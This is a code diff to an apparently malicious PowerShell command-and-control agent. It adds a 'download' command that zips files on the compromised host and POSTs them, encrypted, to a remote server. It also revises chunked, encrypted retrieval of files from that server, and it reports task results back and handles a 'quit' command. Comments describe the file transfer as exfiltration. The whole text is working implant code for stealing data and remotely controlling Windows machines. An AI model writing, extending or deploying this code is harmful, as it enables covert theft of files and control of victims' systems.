@@ -195,8 +195,8 @@ for (;;){
                 $total_parts = Decrypt-String $key $total_parts
                 $xx = $total_parts.split()
                 if ($xx[0] -eq 'VALID') {
-                    if (Test-Path $file) {
-                        Remove-Item -Recurse -Force $file
+                    if (Test-Path "$file") {
+                        Remove-Item -Recurse -Force "$file"
                     }
                     for ($i=0; $i -le $xx[1]-1; $i=$i+1 ) {
                         # keep sleeping during exfil
@@ -210,24 +210,109 @@ for (;;){
                         $dec_part_b64 = (Decrypt-String $key $part )
                         if ($dec_part_b64.split()[0] -eq 'VALID') {
                             $bytes = [System.Convert]::FromBase64String($dec_part_b64.split()[1])
-                            add-content -value $bytes -encoding byte -path $file
+                            add-content -value $bytes -encoding byte -path "$file"
                         }
                     }
-
-                    $final_file = $file.Substring(0, $file.lastIndexOf('.'))
-                    if (Test-Path $final_file) {
-                        Remove-Item -Recurse -Force $final_file
+                    $final_file = "$file".Substring(0, "$file".lastIndexOf('.'))
+                    if (Test-Path "$final_file") {
+                        Remove-Item -Recurse -Force "$final_file"
                     }
                     Expand-Archive -Path "$file" -DestinationPath .
                     Remove-Item -Recurse -Force "$file"
 
-                    $res = "VALID file uploades - " + "$final_file"
+                    $res = "VALID file downloaded - " + "$final_file"
                     $res  = Encrypt-String $key $res
                     $data    = @{result = "$res"}
                     $resultfl = ("$resultl" + "$taskId")
                     Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
                 }
             }
+
+            ### dev
+            elseif ($command -eq "download"){
+                $file = $args
+                if ( "$file".contains('\') ){
+                    $file_name = "$file".split('\')[-1]
+                } else {
+                    $file_name = $file
+                }
+                write-host $file
+                write-host $file_name
+                if (-not(Test-Path "$file")) {
+                    $res = "VALID file " + "$file_name" + " not found!"
+                    $res  = Encrypt-String $key $res
+                    $data    = @{result = "$res"}
+                    $resultfl = ("$resultl" + "$taskId")
+                    Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
+                } else {
+                    $zip_name = "$file" + ".zip"
+                    Compress-Archive -LiteralPath "$file" -Force -DestinationPath "$zip_name" -CompressionLevel Optimal
+                    $file_bin = Get-Content -Encoding Byte -Raw -Path "$zip_name"
+
+                    $byte_split = New-Object -TypeName System.Collections.ArrayList
+                    $lenght = $file_bin.Length
+                    $chunks_size = 200
+
+                    write-host $lenght
+                    $init = "VALID init"
+                    $init  = Encrypt-String $key $init
+                    $enc_len = "VALID " + "$lenght.ToSTring()"
+                    $enc_len  = Encrypt-String $key $enc_len
+                    $data = @{
+                        info = "$init"
+                        chunk = "$enc_len"
+                    }
+                    $downloadfl = ("$downloadl" + "$file_name")
+                    Invoke-WebRequest -UseBasicParsing -Uri $downloadfl -Body $data -Method 'POST'
+
+                    if ($lenght -le $chunks_size){
+                        write-host "HEREEEEE"
+                    }
+
+                }
+                # $downloadl = ("$downloadl" + "$file")
+                # $data    = @{
+                #     part = "init"
+                #     name = "$name"
+                #     }
+                # $total_parts = (Invoke-WebRequest -UseBasicParsing -Uri $uploadfl -Body $data -Method 'POST').Content
+                # $total_parts = Decrypt-String $key $total_parts
+                # $xx = $total_parts.split()
+                # if ($xx[0] -eq 'VALID') {
+                #     if (Test-Path $file) {
+                #         Remove-Item -Recurse -Force $file
+                #     }
+                #     for ($i=0; $i -le $xx[1]-1; $i=$i+1 ) {
+                #         # keep sleeping during exfil
+                #         sleep $n
+                        
+                #         $data    = @{
+                #             part = "$i"
+                #             name = "$name"
+                #             }
+                #         $part = (Invoke-WebRequest -UseBasicParsing -Uri $uploadfl -Body $data -Method 'POST').Content
+                #         $dec_part_b64 = (Decrypt-String $key $part )
+                #         if ($dec_part_b64.split()[0] -eq 'VALID') {
+                #             $bytes = [System.Convert]::FromBase64String($dec_part_b64.split()[1])
+                #             add-content -value $bytes -encoding byte -path $file
+                #         }
+                #     }
+
+                #     $final_file = $file.Substring(0, $file.lastIndexOf('.'))
+                #     if (Test-Path $final_file) {
+                #         Remove-Item -Recurse -Force $final_file
+                #     }
+                #     Expand-Archive -Path "$file" -DestinationPath .
+                #     Remove-Item -Recurse -Force "$file"
+
+                #     $res = "VALID file downloaded - " + "$final_file"
+                #     $res  = Encrypt-String $key $res
+                #     $data    = @{result = "$res"}
+                #     $resultfl = ("$resultl" + "$taskId")
+                #     Invoke-WebRequest -UseBasicParsing -Uri $resultfl -Body $data -Method 'POST'
+                # }
+            }
+
             elseif ($command -eq "quit"){
                 $res = "VALID agent dead " + "$name"
                 $res  = Encrypt-String $key $res
